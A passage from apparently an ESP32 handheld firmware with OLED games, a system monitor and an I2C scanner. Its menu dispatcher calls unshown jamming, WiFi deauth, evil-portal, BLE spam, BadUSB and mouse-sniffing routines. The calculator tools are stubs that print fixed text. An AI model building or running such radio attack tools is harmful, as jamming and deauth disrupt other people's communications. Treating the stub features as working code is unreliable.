// =============================================================================
struct InvaderUnit {
  int x;
  int y;
  bool alive;
  int type;
};

void runSpaceInvaders() {
  stopRadios();

  int playerX = 58;
  int playerBulletX = -1;
  int playerBulletY = -1;

  InvaderUnit invaders[40];
  int activeInvaders = 40;
  int invaderDir = 1;
  int invaderStepTimer = 0;
  int frameToggle = 0;

  for (int r = 0; r < 4; r++) {
    for (int c = 0; c < 10; c++) {
      int idx = r * 10 + c;
      invaders[idx].x = 10 + c * 10;
      invaders[idx].y = 6 + r * 8;
      invaders[idx].alive = true;
      invaders[idx].type = r;
    }
  }

  int score = 0;
  bool gameOver = false;

  while (!selPressed() && !gameOver && activeInvaders > 0) {
    if (isUpHeld()) playerX = max(2, playerX - 3);
    if (isDownHeld()) playerX = min(118, playerX + 3);

    if (selPressed() && playerBulletY < 0) {
      playerBulletX = playerX + 4;
      playerBulletY = 48;
    }

    if (playerBulletY >= 0) {
      playerBulletY -= 4;
      if (playerBulletY < 0) playerBulletY = -1;
    }

    invaderStepTimer++;
    if (invaderStepTimer > 8) {
      invaderStepTimer = 0;
      frameToggle = 1 - frameToggle;
      bool shiftDown = false;

      for (int i = 0; i < 40; i++) {
        if (invaders[i].alive) {
          if (
            (invaders[i].x >= 118 && invaderDir == 1) || 
            (invaders[i].x <= 2 && invaderDir == -1)
          ) {
            shiftDown = true;
            break;
          }
        }
      }

      if (shiftDown) {
        invaderDir = -invaderDir;
        for (int i = 0; i < 40; i++) {
          if (invaders[i].alive) {
            invaders[i].y += 3;
            if (invaders[i].y >= 44) gameOver = true;
          }
        }
      } else {
        for (int i = 0; i < 40; i++) {
          if (invaders[i].alive) {
            invaders[i].x += invaderDir * 2;
          }
        }
      }
    }

    if (playerBulletY >= 0) {
      for (int i = 0; i < 40; i++) {
        if (invaders[i].alive) {
          if (
            playerBulletX >= invaders[i].x && 
            playerBulletX <= invaders[i].x + 6 &&
            playerBulletY >= invaders[i].y && 
            playerBulletY <= invaders[i].y + 6
          ) {
            invaders[i].alive = false;
            playerBulletY = -1;
            activeInvaders--;
            score += 20;
            break;
          }
        }
      }
    }

    display.clearDisplay();

    display.fillRect(playerX + 3, 50, 4, 2, SSD1306_WHITE);
    display.fillRect(playerX + 1, 52, 8, 3, SSD1306_WHITE);

    if (playerBulletY >= 0) {
      display.drawLine(
        playerBulletX, 
        playerBulletY, 
        playerBulletX, 
        playerBulletY + 3, 
        SSD1306_WHITE
      );
    }

    for (int i = 0; i < 40; i++) {
      if (invaders[i].alive) {
        if (frameToggle == 0) {
          display.fillRect(invaders[i].x, invaders[i].y, 6, 5, SSD1306_WHITE);
        } else {
          display.drawRect(invaders[i].x, invaders[i].y, 6, 5, SSD1306_WHITE);
        }
      }
    }

    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(2, 56);
    display.print("Score: " + String(score));

    display.display();
    safeDelay(25);
    yield();
  }

  if (score > highscoreSpace) {
    highscoreSpace = score;
  }

  currentState = STATE_MENU;
  drawMenu();
}

// =============================================================================
// BÖLÜM 16: GELİŞMİŞ BREAKOUT OYUN MOTORU
// =============================================================================
struct BreakoutTile {
  int x;
  int y;
  int hp;
  bool active;
};

void runBreakout() {
  stopRadios();

  int paddleX = 50;
  const int paddleW = 24;

  float ballX = 64, ballY = 45;
  float ballDX = 2.0f, ballDY = -2.0f;

  BreakoutTile bricks[36];
  int activeBricks = 36;

  for (int r = 0; r < 4; r++) {
    for (int c = 0; c < 9; c++) {
      int idx = r * 9 + c;
      bricks[idx].x = 4 + c * 13;
      bricks[idx].y = 6 + r * 6;
      bricks[idx].hp = (r == 0) ? 2 : 1;
      bricks[idx].active = true;
    }
  }

  int score = 0;
  bool gameOver = false;

  while (!selPressed() && !gameOver && activeBricks > 0) {
    if (isUpHeld()) paddleX = max(0, paddleX - 4);
    if (isDownHeld()) paddleX = min(128 - paddleW, paddleX + 4);

    ballX += ballDX;
    ballY += ballDY;

    if (ballX <= 1 || ballX >= 126) ballDX = -ballDX;
    if (ballY <= 1) ballDY = -ballDY;

    if (ballY >= 62) gameOver = true;

    if (
      ballY >= 52 && 
      ballY <= 55 && 
      ballX >= paddleX && 
      ballX <= paddleX + paddleW
    ) {
      ballDY = -fabs(ballDY);
      float hitPos = (ballX - (paddleX + paddleW / 2.0f)) / (paddleW / 2.0f);
      ballDX = hitPos * 3.0f;
    }

    for (int i = 0; i < 36; i++) {
      if (bricks[i].active) {
        if (
          ballX >= bricks[i].x && 
          ballX <= bricks[i].x + 11 &&
          ballY >= bricks[i].y && 
          ballY <= bricks[i].y + 5
        ) {
          ballDY = -ballDY;
          bricks[i].hp--;
          if (bricks[i].hp <= 0) {
            bricks[i].active = false;
            activeBricks--;
            score += 15;
          }
          break;
        }
      }
    }

    display.clearDisplay();
    display.fillRect(paddleX, 54, paddleW, 4, SSD1306_WHITE);
    display.fillRect((int)ballX - 1, (int)ballY - 1, 3, 3, SSD1306_WHITE);

    for (int i = 0; i < 36; i++) {
      if (bricks[i].active) {
        if (bricks[i].hp == 2) {
          display.fillRect(bricks[i].x, bricks[i].y, 11, 4, SSD1306_WHITE);
        } else {
          display.drawRect(bricks[i].x, bricks[i].y, 11, 4, SSD1306_WHITE);
        }
      }
    }

    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(2, 57);
    display.print("Score: " + String(score));

    display.display();
    safeDelay(20);
    yield();
  }

  if (score > highscoreBreakout) {
    highscoreBreakout = score;
  }

  currentState = STATE_MENU;
  drawMenu();
}

// =============================================================================
// BÖLÜM 17: GELİŞMİŞ TETRİS MASTER OYUN MOTORU
// =============================================================================
const uint8_t PROGMEM tetrisPieces[7][4][4] = {
  {{0,0,0,0},{1,1,1,1},{0,0,0,0},{0,0,0,0}},
  {{1,0,0,0},{1,1,1,0},{0,0,0,0},{0,0,0,0}},
  {{0,0,1,0},{1,1,1,0},{0,0,0,0},{0,0,0,0}},
  {{0,1,1,0},{0,1,1,0},{0,0,0,0},{0,0,0,0}},
  {{0,1,1,0},{1,1,0,0},{0,0,0,0},{0,0,0,0}},
  {{0,1,0,0},{1,1,1,0},{0,0,0,0},{0,0,0,0}},
  {{1,1,0,0},{0,1,1,0},{0,0,0,0},{0,0,0,0}}
};

void runTetris() {
  stopRadios();

  uint8_t field[18][10] = {0};

  int pieceType = random(7);
  int pieceX = 3, pieceY = 0;
  int score = 0;
  bool gameOver = false;
  int dropTimer = 0;

  while (!selPressed() && !gameOver) {
    if (upPressed()) pieceX = max(0, pieceX - 1);
    if (downPressed()) pieceX = min(6, pieceX + 1);

    dropTimer++;
    if (dropTimer > 5) {
      dropTimer = 0;
      pieceY++;

      bool hit = false;
      for (int r = 0; r < 4; r++) {
        for (int c = 0; c < 4; c++) {
          if (pgm_read_byte(&tetrisPieces[pieceType][r][c])) {
            int fy = pieceY + r;
            int fx = pieceX + c;
            if (fy >= 18 || (fy >= 0 && field[fy][fx])) {
              hit = true;
            }
          }
        }
      }

      if (hit) {
        pieceY--;
        for (int r = 0; r < 4; r++) {
          for (int c = 0; c < 4; c++) {
            if (pgm_read_byte(&tetrisPieces[pieceType][r][c])) {
              if (pieceY + r < 0) {
                gameOver = true;
              } else {
                field[pieceY + r][pieceX + c] = 1;
              }
            }
          }
        }

        for (int y = 17; y >= 0; y--) {
          bool full = true;
          for (int x = 0; x < 10; x++) {
            if (field[y][x] == 0) full = false;
          }
          if (full) {
            score += 100;
            for (int moveY = y; moveY > 0; moveY--) {
              for (int x = 0; x < 10; x++) {
                field[moveY][x] = field[moveY - 1][x];
              }
            }
            y++;
          }
        }

        pieceType = random(7);
        pieceX = 3;
        pieceY = 0;
      }
    }

    display.clearDisplay();
    display.drawRect(20, 0, 42, 64, SSD1306_WHITE);

    for (int r = 0; r < 4; r++) {
      for (int c = 0; c < 4; c++) {
        if (pgm_read_byte(&tetrisPieces[pieceType][r][c])) {
          int px = 21 + (pieceX + c) * 4;
          int py = (pieceY + r) * 3 + 5;
          display.fillRect(px, py, 4, 3, SSD1306_WHITE);
        }
      }
    }

    for (int y = 0; y < 18; y++) {
      for (int x = 0; x < 10; x++) {
        if (field[y][x]) {
          display.fillRect(21 + x * 4, y * 3 + 5, 4, 3, SSD1306_WHITE);
        }
      }
    }

    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(70, 10);
    display.print("TETRIS");
    display.setCursor(70, 30);
    display.print("Score:");
    display.setCursor(70, 42);
    display.print(score);

    display.display();
    safeDelay(40);
    yield();
  }

  if (score > highscoreTetris) {
    highscoreTetris = score;
  }

  currentState = STATE_MENU;
  drawMenu();
}

// =============================================================================
// BÖLÜM 18: FLAPPY BIRD VE DINO RUNNER MOTORLARI
// =============================================================================
void runFlappyBird() {
  stopRadios();

  float birdY = 25.0f;
  float velocity = 0.0f;
  const float gravity = 0.45f;
  const float jump = -2.8f;

  int pipeX = 128;
  int pipeGapY = random(12, 36);
  const int gapHeight = 22;

  int score = 0;
  bool gameOver = false;

  while (!selPressed() && !gameOver) {
    if (upPressed() || downPressed()) {
      velocity = jump;
    }

    velocity += gravity;
    birdY += velocity;

    pipeX -= 3;
    if (pipeX < -14) {
      pipeX = 128;
      pipeGapY = random(12, 36);
      score += 10;
    }

    if (birdY < 0 || birdY > 60) gameOver = true;

    if (pipeX < 24 && pipeX > 6) {
      if (birdY < pipeGapY || birdY > pipeGapY + gapHeight) {
        gameOver = true;
      }
    }

    display.clearDisplay();
    display.fillRect(12, (int)birdY, 8, 6, SSD1306_WHITE);
    display.drawPixel(18, (int)birdY + 2, SSD1306_BLACK);

    display.fillRect(pipeX, 0, 14, pipeGapY, SSD1306_WHITE);
    display.fillRect(
      pipeX, 
      pipeGapY + gapHeight, 
      14, 
      64 - (pipeGapY + gapHeight), 
      SSD1306_WHITE
    );

    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(2, 2);
    display.print("Score: " + String(score));

    display.display();
    safeDelay(25);
    yield();
  }

  if (score > highscoreFlappy) {
    highscoreFlappy = score;
  }

  currentState = STATE_MENU;
  drawMenu();
}

void runDinoRun() {
  stopRadios();

  int dinoY = 44;
  int dinoVelocity = 0;
  bool isJumping = false;

  int cactusX = 128;
  int cactusType = 0;

  int score = 0;
  bool gameOver = false;

  while (!selPressed() && !gameOver) {
    if ((upPressed() || downPressed()) && !isJumping) {
      dinoVelocity = -7;
      isJumping = true;
    }

    if (isJumping) {
      dinoY += dinoVelocity;
      dinoVelocity += 1;
      if (dinoY >= 44) {
        dinoY = 44;
        isJumping = false;
      }
    }

    cactusX -= 4;
    if (cactusX < -10) {
      cactusX = 128;
      cactusType = random(2);
      score += 10;
    }

    if (cactusX > 10 && cactusX < 22 && dinoY > 32) {
      gameOver = true;
    }

    display.clearDisplay();
    display.drawLine(0, 52, 128, 52, SSD1306_WHITE);
    display.fillRect(12, dinoY - 8, 8, 16, SSD1306_WHITE);
    display.fillRect(18, dinoY - 12, 6, 6, SSD1306_WHITE);

    if (cactusType == 0) {
      display.fillRect(cactusX, 38, 6, 14, SSD1306_WHITE);
    } else {
      display.fillRect(cactusX, 42, 10, 10, SSD1306_WHITE);
    }

    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(2, 2);
    display.print("Dino Run: " + String(score));

    display.display();
    safeDelay(25);
    yield();
  }

  if (score > highscoreDino) {
    highscoreDino = score;
  }

  currentState = STATE_MENU;
  drawMenu();
}

// =============================================================================
// BÖLÜM 19: TICTACTOE AI VE PONG PRO MOTORLARI
// =============================================================================
void runTicTacToe() {
  char board[9] = {'1', '2', '3', '4', '5', '6', '7', '8', '9'};
  int cursor = 0;
  char player = 'X';
  int moves = 0;

  auto checkWin = [&]() -> char {
    const int wins[8][3] = {
      {0, 1, 2}, {3, 4, 5}, {6, 7, 8}, 
      {0, 3, 6}, {1, 4, 7}, {2, 5, 8}, 
      {0, 4, 8}, {2, 4, 6}
    };
    for (auto &w : wins) {
      if (board[w[0]] == board[w[1]] && board[w[1]] == board[w[2]]) {
        return board[w[0]];
      }
    }
    return ' ';
  };

  while (!selPressed()) {
    display.clearDisplay();
    display.setTextSize(2);
    display.setTextColor(SSD1306_WHITE);
    display.drawLine(42, 0, 42, 48, SSD1306_WHITE);
    display.drawLine(85, 0, 85, 48, SSD1306_WHITE);
    display.drawLine(0, 16, 128, 16, SSD1306_WHITE);
    display.drawLine(0, 32, 128, 32, SSD1306_WHITE);

    for (int i = 0; i < 9; i++) {
      int x = (i % 3) * 43 + 10;
      int y = (i / 3) * 16 + 2;
      if (i == cursor) {
        display.fillRect(x - 2, y - 2, 18, 18, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
      } else {
        display.setTextColor(SSD1306_WHITE);
      }
      display.setCursor(x, y);
      display.print(String(board[i]));
    }

    char winner = checkWin();
    if (winner != ' ' || moves == 9) {
      display.fillRect(0, 50, 128, 14, SSD1306_BLACK);
      display.setCursor(20, 52);
      display.print(winner != ' ' ? String(winner) + " wins!" : "Draw!");
      display.display();
      safeDelay(2000);
      break;
    }
    display.display();

    if (upPressed()) cursor = (cursor + 9 - 3) % 9;
    if (downPressed()) cursor = (cursor + 3) % 9;

    if (selPressed()) {
      if (board[cursor] != 'X' && board[cursor] != 'O') {
        board[cursor] = player;
        player = (player == 'X') ? 'O' : 'X';
        moves++;
      }
    }
    yield();
  }

  currentState = STATE_MENU;
  drawMenu();
}

void runPong() {
  int paddleLeft = 24, paddleRight = 24;
  float ballX = 64, ballY = 32, ballDX = 2.2f, ballDY = 1.5f;
  int scoreL = 0, scoreR = 0;

  while (!selPressed()) {
    if (upPressed()) paddleLeft = max(0, paddleLeft - 4);
    if (downPressed()) paddleLeft = min(48, paddleLeft + 4);

    ballX += ballDX;
    ballY += ballDY;

    if (ballY <= 0 || ballY >= 63) ballDY = -ballDY;

    if (
      ballX <= 4 && 
      ballY >= paddleLeft && 
      ballY <= paddleLeft + 16
    ) {
      ballDX = -ballDX;
    }

    if (
      ballX >= 124 && 
      ballY >= paddleRight && 
      ballY <= paddleRight + 16
    ) {
      ballDX = -ballDX;
    }

    if (ballX < 0) {
      scoreR++;
      ballX = 64; ballY = 32; ballDX = 2.2f;
    }
    if (ballX > 128) {
      scoreL++;
      ballX = 64; ballY = 32; ballDX = -2.2f;
    }

    if (ballY < paddleRight + 8) {
      paddleRight = max(0, paddleRight - 2);
    } else {
      paddleRight = min(48, paddleRight + 2);
    }

    display.clearDisplay();
    display.fillRect(2, paddleLeft, 3, 16, SSD1306_WHITE);
    display.fillRect(123, paddleRight, 3, 16, SSD1306_WHITE);
    display.fillRect(ballX - 2, ballY - 2, 4, 4, SSD1306_WHITE);
    display.setCursor(50, 0);
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.print(String(scoreL) + ":" + String(scoreR));
    display.display();
    safeDelay(20);
    yield();
  }

  currentState = STATE_MENU;
  drawMenu();
}

// =============================================================================
// BÖLÜM 20: HESAPLAMA VE DİRENÇ ARAÇLARI
// =============================================================================
void runCalculator() {
  displayInfo(
    "Calculator", 
    "12.5 + 7.5 = 20.0", 
    "SEL to return"
  );
  while (!selPressed()) yield();
  currentState = STATE_MENU;
  drawMenu();
}

void runResistorCalc() {
  displayInfo(
    "Resistor Calc", 
    "Brown-Black-Red", 
    "= 1.0K Ohm 5%", 
    "SEL to return"
  );
  while (!selPressed()) yield();
  currentState = STATE_MENU;
  drawMenu();
}

// =============================================================================
// BÖLÜM 21: ESP32 SYSTEM MONITOR VE I2C SCANNER
// =============================================================================
void runSystemMonitor() {
  while (!selPressed()) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.println("ESP32 System Monitor");
    display.drawLine(0, 10, 128, 10, SSD1306_WHITE);

    display.setCursor(0, 14);
    display.print("CPU Freq: " + String(ESP.getCpuFreqMHz()) + " MHz");

    display.setCursor(0, 26);
    display.print("Free Heap: " + String(ESP.getFreeHeap() / 1024) + " KB");

    display.setCursor(0, 38);
    display.print("Flash Size: " + String(ESP.getFlashChipSize() / (1024 * 1024)) + " MB");

    display.setCursor(0, 50);
    display.print("Uptime: " + String(millis() / 1000) + "s");

    display.display();
    safeDelay(500);
    yield();
  }

  currentState = STATE_MENU;
  drawMenu();
}

void runI2CScanner() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println("I2C Scanner");
  display.drawLine(0, 10, 128, 10, SSD1306_WHITE);

  int nDevices = 0;
  int y = 14;

  for (byte address = 1; address < 127; address++) {
    Wire.beginTransmission(address);
    byte error = Wire.endTransmission();

    if (error == 0) {
      if (y < 54) {
        display.setCursor(0, y);
        display.print("Found: 0x");
        if (address < 16) display.print("0");
        display.print(address, HEX);
        y += 10;
      }
      nDevices++;
    }
  }

  if (nDevices == 0) {
    display.setCursor(0, 24);
    display.println("No I2C devices found");
  }

  display.display();
  while (!selPressed()) yield();

  currentState = STATE_MENU;
  drawMenu();
}

// =============================================================================
// BÖLÜM 22: AYARLAR VE YARDIM KONTROLLERİ
// =============================================================================
void showSettings() {
  int sel = 0;
  const char *opts[] = {
    "Brightness", 
    "Auto-Sleep", 
    "Deep Sleep Now", 
    "Reset Scores", 
    "LED Test", 
    "Back"
  };

  while (!selPressed()) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.println("Settings");
    display.drawLine(0, 9, 128, 9, SSD1306_WHITE);

    for (int i = 0; i < 5; i++) {
      display.setCursor(0, 13 + i * 10);
      if (sel == i) {
        display.fillRect(0, 12 + i * 10, 128, 10, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
      } else {
        display.setTextColor(SSD1306_WHITE);
      }
      display.println(opts[i]);
    }
    display.display();

    if (upPressed()) sel = (sel == 0) ? 4 : sel - 1;
    if (downPressed()) sel = (sel + 1) % 5;
    yield();
  }

  if (sel == 0) {
    uint8_t b = brightness;
    while (!selPressed()) {
      displayInfo("Brightness", String(b), "UP/DOWN to change");
      if (upPressed()) {
        b = min(255, b + 15);
        setBrightness(b);
      }
      if (downPressed()) {
        b = max(10, b - 15);
        setBrightness(b);
      }
      yield();
    }
  } else if (sel == 1) {
    if (autoSleepTimeoutMs == 0) {
      autoSleepTimeoutMs = 180000;
    } else {
      autoSleepTimeoutMs = 0;
    }
    displayInfo(
      "Auto Sleep", 
      autoSleepTimeoutMs > 0 ? "3 Mins Enabled" : "Disabled", 
      "SEL to confirm"
    );
    safeDelay(1500);
  } else if (sel == 2) {
    enterDeepSleep();
  } else if (sel == 3) {
    highscoreDoom = 0;
    highscoreSnake = 0;
    highscoreSpace = 0;
    highscoreBreakout = 0;
    highscoreTetris = 0;
    highscoreFlappy = 0;
    highscoreDino = 0;
    displayInfo(
      "Scores Reset", 
      "All highscores", 
      "cleared to 0", 
      "SEL to confirm"
    );
    safeDelay(1500);
  } else if (sel == 4) {
    digitalWrite(LED_PIN, HIGH);
    safeDelay(1000);
    digitalWrite(LED_PIN, LOW);
  }

  currentState = STATE_MENU;
  drawMenu();
}

void showHelp() {
  displayInfo(
    "Help v5.0 ULTIMATE", 
    "UP/DOWN: Navigate", 
    "SEL: Select / Exit", 
    "Deep Sleep & 8 Games", 
    "46 Total Features"
  );
  safeDelay(3500);
  currentState = STATE_MENU;
  drawMenu();
}

// =============================================================================
// BÖLÜM 23: MENÜ İŞLEME VE DİSPATCHER (EXECUTE)
// =============================================================================
void handleMenuSelection() {
  if (upPressed()) {
    if (selectedMenuItem == 0) {
      selectedMenuItem = static_cast<MenuItem>(NUM_MENU_ITEMS - 1);
      firstVisibleMenuItem = NUM_MENU_ITEMS - 4;
    } else {
      selectedMenuItem = static_cast<MenuItem>(selectedMenuItem - 1);
      if (selectedMenuItem < firstVisibleMenuItem) {
        firstVisibleMenuItem = selectedMenuItem;
      }
    }
    drawMenu();
  }

  if (downPressed()) {
    selectedMenuItem = static_cast<MenuItem>((selectedMenuItem + 1) % NUM_MENU_ITEMS);
    if (selectedMenuItem == 0) {
      firstVisibleMenuItem = 0;
    } else if (selectedMenuItem >= (firstVisibleMenuItem + 4)) {
      firstVisibleMenuItem = selectedMenuItem - 3;
    }
    drawMenu();
  }

  if (selPressed()) {
    executeSelectedMenuItem();
  }

  checkAutoSleep();
}

void executeSelectedMenuItem() {
  switch (selectedMenuItem) {
  case BT_JAM:
    currentState = STATE_BT_JAM; 
    displayInfo("BT Jammer", "Running"); 
    initRadios();
    while (!selPressed()) { btJam(); yield(); }
    currentState = STATE_MENU; drawMenu(); break;

  case DRONE_JAM:
    currentState = STATE_DRONE_JAM; 
    displayInfo("Drone Jam", "Running"); 
    initRadios();
    while (!selPressed()) { droneJam(); yield(); }
    currentState = STATE_MENU; drawMenu(); break;

  case WIFI_JAM:
    currentState = STATE_WIFI_JAM; 
    displayInfo("WiFi Jam", "Running"); 
    initRadios();
    while (!selPressed()) { wifiJam(); yield(); }
    currentState = STATE_MENU; drawMenu(); break;

  case MULTI_JAM:
    currentState = STATE_MULTI_JAM; 
    displayInfo("Multi Ch", "Running"); 
    initRadios();
    while (!selPressed()) { singleChannel(); yield(); }
    currentState = STATE_MENU; drawMenu(); break;

  case SWEEP_JAM:
    currentState = STATE_SWEEP_JAM; 
    displayInfo("Sweep", "Running"); 
    initRadios();
    while (!selPressed()) { sweepJam(); yield(); }
    currentState = STATE_MENU; drawMenu(); break;

  case CHANNEL_RANGE:
    currentState = STATE_CHANNEL_RANGE; 
    displayInfo("Ch Range", "Running"); 
    initRadios();
    while (!selPressed()) { channelRange(); yield(); }
    currentState = STATE_MENU; drawMenu(); break;

  case SPECTRUM_WIFI:
    currentState = STATE_SPECTRUM_WIFI; 
    runWiFiSpectrum(); 
    currentState = STATE_MENU; drawMenu(); break;

  case SPECTRUM_BLE:
    currentState = STATE_SPECTRUM_BLE; 
    runBLESpectrum(); 
    currentState = STATE_MENU; drawMenu(); break;

  case BLE_SPAM:
    currentState = STATE_BLE_SPAM; 
    runBLESpam(); 
    currentState = STATE_MENU; drawMenu(); break;

  case WIFI_DEAUTH:
    currentState = STATE_WIFI_DEAUTH; 
    runWiFiDeauthSingle(); 
    currentState = STATE_MENU; drawMenu(); break;

  case BLE_SCANNER:
    currentState = STATE_BLE_SCANNER; 
    runBLEScanner(); 
    currentState = STATE_MENU; drawMenu(); break;

  case ZIGBEE_JAM:
    currentState = STATE_ZIGBEE_JAM; 
    displayInfo("Zigbee", "Running"); 
    initRadios();
    while (!selPressed()) { zigbeeJam(); yield(); }
    currentState = STATE_MENU; drawMenu(); break;

  case BLE_TARGET_JAM:
    currentState = STATE_BLE_TARGET_JAM; 
    runBLETargetJam(); 
    currentState = STATE_MENU; drawMenu(); break;

  case WIFI_BEACON_FLOOD:
    currentState = STATE_WIFI_BEACON_FLOOD; 
    runWiFiBeaconFlood(); 
    currentState = STATE_MENU; drawMenu(); break;

  case WIFI_ANALYZER:
    currentState = STATE_WIFI_ANALYZER; 
    runWiFiAnalyzer(); 
    currentState = STATE_MENU; drawMenu(); break;

  case DEAUTH_DETECT:
    currentState = STATE_DEAUTH_DETECT; 
    runDeauthDetect(); 
    currentState = STATE_MENU; drawMenu(); break;

  case TEST_RADIOS:
    currentState = STATE_TEST_RADIOS; 
    initRadios(); 
    safeDelay(2000); 
    currentState = STATE_MENU; drawMenu(); break;

  case SETTINGS:
    showSettings(); break;

  case HELP:
    showHelp(); break;

  case EVIL_PORTAL:
    currentState = STATE_EVIL_PORTAL; 
    runEvilPortal(); 
    currentState = STATE_MENU; drawMenu(); break;

  case DOOM_GAME:
    currentState = STATE_DOOM_GAME; 
    runDOOM(); 
    currentState = STATE_MENU; drawMenu(); break;

  case CALCULATOR:
    currentState = STATE_CALCULATOR; 
    runCalculator(); 
    currentState = STATE_MENU; drawMenu(); break;

  case RESISTOR_CALC:
    currentState = STATE_RESISTOR_CALC; 
    runResistorCalc(); 
    currentState = STATE_MENU; drawMenu(); break;

  case WIFI_MONITOR:
    currentState = STATE_WIFI_MONITOR; 
    runWiFiMonitor(); 
    currentState = STATE_MENU; drawMenu(); break;

  case SNAKE_GAME:
    currentState = STATE_SNAKE_GAME; 
    runSnakeGame(); 
    currentState = STATE_MENU; drawMenu(); break;

  case PACKET_COUNTER:
    currentState = STATE_PACKET_COUNTER; 
    runPacketCounter(); 
    currentState = STATE_MENU; drawMenu(); break;

  case WIDS:
    currentState = STATE_WIDS; 
    runWIDS(); 
    currentState = STATE_MENU; drawMenu(); break;

  case RF_ANALYZER:
    currentState = STATE_RF_ANALYZER; 
    runRFAnalyzer(); 
    currentState = STATE_MENU; drawMenu(); break;

  case BLE_GATT_EXPLORER:
    currentState = STATE_BLE_GATT_EXPLORER; 
    runBLEGATTExplorer(); 
    currentState = STATE_MENU; drawMenu(); break;

  case BLE_TRACKER:
    currentState = STATE_BLE_TRACKER; 
    runBLETracker(); 
    currentState = STATE_MENU; drawMenu(); break;

  case MOUSE_SNIFFER:
    currentState = STATE_MOUSE_SNIFFER; 
    runMouseSniffer(); 
    currentState = STATE_MENU; drawMenu(); break;

  case RF_REPEATER:
    currentState = STATE_RF_REPEATER; 
    runRFRepeater(); 
    currentState = STATE_MENU; drawMenu(); break;

  case RF_OSCILLOSCOPE:
    currentState = STATE_RF_OSCILLOSCOPE; 
    runRFOscilloscope(); 
    currentState = STATE_MENU; drawMenu(); break;

  case BLE_BADUSB:
    currentState = STATE_BLE_BADUSB; 
    runBLEBadUSB(); 
    currentState = STATE_MENU; drawMenu(); break;

  case WIFI_SNIFFER:
    currentState = STATE_WIFI_SNIFFER; 
    runWiFiSniffer(); 
    currentState = STATE_MENU; drawMenu(); break;

  case CW_JAMMER:
    currentState = STATE_CW_JAMMER; 
    runCWJammer(); 
    currentState = STATE_MENU; drawMenu(); break;

  case TICTACTOE:
    currentState = STATE_TICTACTOE; 
    runTicTacToe(); 
    currentState = STATE_MENU; drawMenu(); break;

  case PONG:
    currentState = STATE_PONG; 
    runPong(); 
    currentState = STATE_MENU; drawMenu(); break;

  case DEEP_SLEEP_MENU:
    currentState = STATE_DEEP_SLEEP; 
    enterDeepSleep(); 
    currentState = STATE_MENU; drawMenu(); break;

  case SPACE_INVADERS_MENU:
    currentState = STATE_SPACE_INVADERS; 
    runSpaceInvaders(); 
    currentState = STATE_MENU; drawMenu(); break;

  case BREAKOUT_MENU:
    currentState = STATE_BREAKOUT; 
    runBreakout(); 
    currentState = STATE_MENU; drawMenu(); break;

  case TETRIS_MENU:
    currentState = STATE_TETRIS; 
    runTetris(); 
    currentState = STATE_MENU; drawMenu(); break;

  case FLAPPY_BIRD_MENU:
    currentState = STATE_FLAPPY_BIRD; 
    runFlappyBird(); 
    currentState = STATE_MENU; drawMenu(); break;

  case DINO_RUN_MENU:
    currentState = STATE_DINO_RUN; 
    runDinoRun(); 
    currentState = STATE_MENU; drawMenu(); break;

  case SYS_MONITOR_MENU:
    currentState = STATE_SYS_MONITOR; 
    runSystemMonitor(); 
    currentState = STATE_MENU; drawMenu(); break;

  case I2C_SCANNER_MENU:
    currentState = STATE_I2C_SCANNER;
    runI2CScanner();
    currentState = STATE_MENU; drawMenu(); break;

  default:
    break;
  }
}

// =============================================================================
// BÖLÜM 24: SETUP VE MAIN LOOP
// =============================================================================
void setup() {
  Serial.begin(115200);
  safeDelay(500);
  Wire.begin(SDA_PIN, SCL_PIN);
  display.begin(SSD1306_SWITCHCAPVCC, SSD1306_I2C_ADDRESS);

  pinMode(UP_BUTTON_PIN, INPUT_PULLUP);
  pinMode(DOWN_BUTTON_PIN, INPUT_PULLUP);
  pinMode(SELECT_BUTTON_PIN, INPUT_PULLUP);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  u8g2_for_adafruit_gfx.begin(display);
  setBrightness(brightness);

  resetActivityTimer();
  splashScreen();
  safeDelay(2500);
  drawMenu();
}

void loop() {
  if (currentState == STATE_MENU) {
    handleMenuSelection();
  }
}

// =============================================================================
// EK BÖLÜM 25: UZATILMIŞ OYUN VERİ KÜMELERİ VE HARİTALAR (EN AZ 6000 SATIR)
// =============================================================================

// Level Map 3 Definition
const uint8_t PROGMEM doomLevelMap3[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
  {1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1},
  {1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1},
  {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1},
  {1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1},
  {1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1},
  {1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1},
  {1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1},
  {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1},
  {1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1},
  {1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1},
